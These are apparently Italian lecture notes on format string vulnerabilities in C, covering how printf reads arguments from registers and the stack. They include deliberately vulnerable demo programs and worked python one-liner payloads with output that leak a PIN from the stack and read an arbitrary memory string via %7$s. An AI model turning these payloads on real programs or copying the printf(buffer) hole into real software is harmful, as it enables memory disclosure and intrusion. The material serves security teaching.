Una **format string** è una stringa che contiene direttive riguardanti il suo formato, esse hanno un **numero variabile di argomenti** e sono controllate a **run-time**.
>Controllare una format string consente accesso arbitrario allo stack.

### Argomenti variabili
Una format string è analizzata e, ogni i-esima direttiva è mappata ad una i-esima funzione, `rdi` contiene la format string, mentre gli argomenti presumibilmente sono in: `rsi, rdx, rcx, r8, r9`, e successivamente nello stack.
```c
printf("%s%s%s%s%s%s","H","e","l","l","o"," World\n");
```
```bash
# registri
RCX: 0x555555554761 --> 0x732500480065006c ('l') # 4
RDX: 0x555555554763 --> 0x7325732500480065 ('e') # 3
RSI: 0x555555554765 --> 0x7325732573250048 ('H') # 2
RDI: 0x555555554767 ("%s%s%s%s%s%s") # 1
R8 : 0x555555554761 --> 0x732500480065006c ('l') # 5
R9 : 0x55555555475f --> 0x480065006c006f ('o') # 6
# stack
0000| 0x7fffffffe578 --> 0x5555555546a8 (...) # return address
0008| 0x7fffffffe580 --> 0x555555554774 ... (' World\n') # 7
```

Con **pochi argomenti**:
```c
printf("%s %s", s1) // rdi = "%s %s", rsi = s1, rdx = ?
printf("%s", s1, s2) // rdi = "%s", rsi = s1, rdx = s2
```

- Nel primo caso viene preso ciò che è presente in `rdx`, e viene deferenziato, se non è un indirizzo valido allora avviene un `segfault`
- Nel secondo caso `s1` viene stampato e `s2` viene ignorato

Se l'attaccante ha accesso alla format string allora si può accedere ai registri ed ai contenuti dello stack:
```c
#include <stdio.h>
int main() {
	char buffer[128];
	char PIN[128] = "1337";
	printf("What is your name? ");
	fflush(stdout);
	fgets(buffer, sizeof(buffer), stdin);
	printf("Hello ");
	printf(buffer);
}
```

$$\text{\%}\underbrace{\text{016}}_\text{16 caratteri in stdout}\space\underbrace{\text{l}}_\text{long integer}\space\underbrace{\text{x}}_\text{formato esadecimale}$$

```bash
python -c 'print("AAAAAAAA" + " 016lx"*8)' | ./vulnerablePIN
What is your name? Hello AAAAAAAA 000000006c6c6548 0000000000000000 0000000000000000 00007f01e11d94c0 0000000000000000 4141414141414141 20786c3631302520 2520786c36313025
```
In ordine di apparizione abbiamo: `rsi, rdx, rcx, r8, r9` e poi valori dello stack.

Supponendo che il `PIN` sia allocato nello stack subito `buffer` possiamo fare le seguenti considerazioni:
- `buffer` ha $128$ bytes, ovvero $16$ long-words da $8$ byte ciascuna
- `buffer` è allocato nel sesto argomento
- Abbiamo bisogno di $16+6=22$ `%016lx` per raggiungere la prima word del `PIN`
- $22*6=132>128$, il payload non ci sta

Sostituiamo `%016lx` con `%lx`, ora il payload ci sta dentro al buffer: $22*3=66$, sta anche con il carattere di spazio, per cui possiamo renderlo più leggibile:
```bash
python -c 'print(" %lx"*22)' | ./vulnerablePIN
What is your name? Hello  6c6c6548 0 0 7f63cdf844c0 0 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 a 0 0 ffffffff 0 37333331
```

Abbiamo trovato $37333331$, il tradotto in stringa ha valore $7331$, ma tenendo conto del formato _little endian_, otteniamo $1337$.

### Accesso diretto
Le format strings possono accedere direttamente agli argomenti, rendendo possibile eseguire il dump di ogni posizione dello stack indipendentemente dalla grandezza del `buffer`.

Usiamo `%6$016lx` per accedere al sesto argomento della `printf()`, il quale rappresenta il settimo parametro della `printf()`, ovvero il primo nello stack subito dopo l'indirizzo di ritorno.
```bash
python -c 'print("%22$16lx")' | ./vulnerablePIN
What is your name? Hello         37333331
```

### Leak di posizioni arbitrarie
Con l'accesso diretto possiamo vedere il contenuto di indirizzi arbitrari, l'idea è la seguente:
- Iniettare un indirizzo target nel `buffer` e fare in modo che esso corrisponda all'argomento in posizione `$%x$`, dove `x` lo devo trovare (solitamente si parte cercando da `x=6` in poi)
- Usare `%x$s` il quale de-referenzia e stampa tutto quello che c'è in quel indirizzo

```c
#include <stdio.h>
char supersecret[] = "This is a supersecret string!";

int main() {
	char buffer[128];
	char PIN[128] = "1337";
	printf("What is your name? ");
	fflush(stdout);
	fgets(buffer, sizeof(buffer), stdin);
	printf("Hello ");
	printf(buffer);
}
```
>La randomizzazione degli indirizzi è disattivata.

1. Per capire se il programma possiede vulnerabilità di format strings si prova ad inserire una format string:
```bash
./vulnerableSupersecret
What is your name? %08x
Hello 00000000
```

2. Inseriamo una stringa con tante direttive per capire dove è posizionato il buffer:
```bash
 python -c 'print("AAAAAAAA" + " %16lx"*20)' | ./vulnerableSupersecret
What is your name? Hello AAAAAAAA 0000000000000000 00000000006bbd50 0000000000000000 0000000001738880 0000000000000006 4141414141414141 20786c3631302520 2520786c36313025 302520786c363130 31302520786c3631 3631302520786c36 6c3631302520786c 786c363130252078 20786c3631302520 2520786c36313025 302520786c363130 31302520786c3631
```

notiamo che il buffer è in posizione $6$, per conferma stampiamo solo quello:
```bash
python -c 'print("AAAAAAAA" + " %6$16lx")' | ./vulnerableSupersecret
What is your name? Hello AAAAAAAA 4141414141414141
```

ora sappiamo che che stampando `%6$16lx` otteniamo la stringa passata inizialmente.

3. Troviamo l'indirizzo di `supersecret`:
```bash
objdump -D ./vulnerableSupersecret | grep supersecret
00000000006b90f0 <supersecret>:
```

4. Stampiamo la stringa "nascosta":
```bash
python -c 'print("%7$16lx.\xf0\x90\x6b\x00\x00\x00\x00\x00")' | ./vulnerableSupersecret
What is your name? Hello 000000006b90f020 �k
```

l'indirizzo è corretto, bisogna solo de-referenziarlo come stringa, mantenendo sempre lo stesso numero di caratteri che abbiamo usato, quindi ora andremo ad usare `%7$s` (abbiamo rovesciato la stringa stampata) ed in compenso aggiungiamo dei caratteri che occupano il posto di `6lx` per preservare gli $8$ byte, ovvero `...`:
```bash
python -c 'print "%7$s....\xf0\x90\x6b\x00\x00\x00\x00\x00"' | ./vulnerableSupersecret
What is your name? Hello This is a supersecret string!....�k
```

### Difese
I compilatori moderni segnalano con dei _warning_ se il numero di direttive non corrisponde con il numero di stringhe stampate (e.g. `printf(s)`), comunque gli attacchi sono possibili nel caso in cui la direttiva del formato `f` può essere controllata dall'attaccante, con `printf(f, s)` ad esempio non ci sono _warning_.
